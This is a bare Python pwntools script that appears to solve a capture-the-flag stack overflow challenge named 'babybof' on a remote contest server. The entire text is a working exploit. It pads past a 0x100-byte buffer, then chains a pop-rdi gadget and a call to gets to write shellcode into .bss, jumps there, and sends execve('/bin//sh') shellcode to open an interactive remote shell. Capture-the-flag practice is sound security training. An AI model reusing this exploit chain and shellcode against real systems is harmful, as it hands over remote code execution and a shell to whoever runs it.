from pwn import *
r=remote('chals20.cybercastors.com',14425)
b=ELF('./babybof')

prdi=0x4007f3
bss=0x601068
shellcode='\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'

pay=""
pay+='x'*0x100
pay+='x'*0x8
pay+=p64(prdi)
pay+=p64(bss)
pay+=p64(b.symbols['gets'])
pay+=p64(bss)

r.sendline(pay)
r.sendline(shellcode)

r.interactive()
